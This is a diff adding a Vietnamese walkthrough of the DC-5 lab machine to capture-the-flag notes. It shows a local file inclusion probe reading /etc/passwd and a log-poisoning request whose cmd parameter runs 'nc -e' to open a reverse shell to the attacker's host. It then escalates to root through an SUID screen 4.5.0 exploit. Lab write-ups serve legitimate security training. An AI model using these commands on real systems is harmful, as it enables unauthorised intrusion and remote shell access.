@@ -1668,7 +1668,7 @@ Khi ta thực hiện ssh vào thì ta thấy có một thông báo có mail dàn
 
 ![alt text](IMG/DC-4/image-21.png)
 
-### Root Flag
+## Root Flag
 
 Như vậy chúng ta có một câu lệnh có quyền root nhưng mà không cần passwd. Tiếc là câu lệnh này không phải câu lệnh gốc ở trên linux. Ta sẽ thực hiện xem chức năng chính của câu lệnh này:
 
@@ -1689,3 +1689,98 @@ Thành công!
 ![alt text](IMG/DC-4/image-23.png)
 
 ![alt text](IMG/DC-4/image-24.png)
+
+# DC-5
+
+## Recon
+
+Ta thực hiện truy cập trang web sẽ có giao diện như sau:
+
+![alt text](IMG/DC-5/image.png)
+
+## Reverse Shell
+
+Ta sẽ thực hiện khám phá xem website có những chức năng gì, hầu hết toàn giới thiệu và có phần `contact` cho phép chúng ta gửi thông tin của chúng ta.
+
+![alt text](IMG/DC-5/image-1.png)
+
+Sau khi nhập thông tin xong sẽ điều hướng sang trang `thankyou.php` với những tham số mà ta truyền vào:
+
+![alt text](IMG/DC-5/image-2.png)
+
+Một điều đặc biệt khi ta thấy ở đây là Copyright 2018 nhưng khi ta F5 lại thi lại xuất hiện năm khác.
+
+![alt text](IMG/DC-5/image-3.png)
+
+Điều này chứng tỏ đây không phải là một file tĩnh mà đang lấy thông tin từ một tập tin thực sự, lúc này ta kiểm tra xem có dính `lfi` không.
+
+```bash
+172.16.1.132/thankyou.php?file=/etc/passwd
+```
+
+![alt text](IMG/DC-5/image-4.png)
+
+Như vậy laf chúng ta có thể thực hiện reverse shell ở trên hệ thống, ta sẽ sử dụng burp để có thể làm điều đó bằng việc chỉnh các tham số đầu vào.
+
+![alt text](IMG/DC-5/image-5.png)
+
+```bash
+GET /thankyou.php?file=/var/log//nginx/error.log&cmd=nc -e 192.168.0.208 3333| HTTP/1.1
+```
+
+Trên máy kali:
+
+```bash
+nc -lvnp 3333
+```
+
+![alt text](IMG/DC-5/image-6.png)
+
+Khi chúng ta gửi thì thực sự có một kết nối tại đây:
+
+![alt text](IMG/DC-5/image-7.png)
+
+![alt text](IMG/DC-5/image-8.png)
+
+## Exploit Configuration
+
+Ta sẽ thực hiện tìm các fle SUID trên hệ thống
+
+```bash
+find / -perm /4000 -print 2>/dev/null
+```
+
+![alt text](IMG/DC-5/image-9.png)
+
+Ta thấy ở thư mục bin có một lệnh đó lạ đó chính là `screen-4.5.0`, đây là một lệnh cũng đã tương đối là cũ với phiên bản 4.5.0 nên có thể có chứa `expploit`:
+
+![alt text](IMG/DC-5/image-10.png)
+
+ta sẽ search thử exploit của lệnh đó:
+
+```bash
+searchsploit screen 4.5.0
+```
+
+![alt text](IMG/DC-5/image-11.png)
+
+Ta thực hiện tìm file exploit ở trên mạng và thực hiện tải về:
+
+![alt text](IMG/DC-5/image-12.png)
+
+Ta thực hiện tải shell về trên máy của DC-5:
+
+![alt text](IMG/DC-5/image-13.png)
+
+Cấp quyền cho file và thực hiện chạy:
+
+```bash
+chmod +x script.sh
+./script
+```
+
+![alt text](IMG/DC-5/image-14.png)
+
+Sau khi chạy xong thì ta sẽ có quyền root.
+
+![alt text](IMG/DC-5/image-15.png)
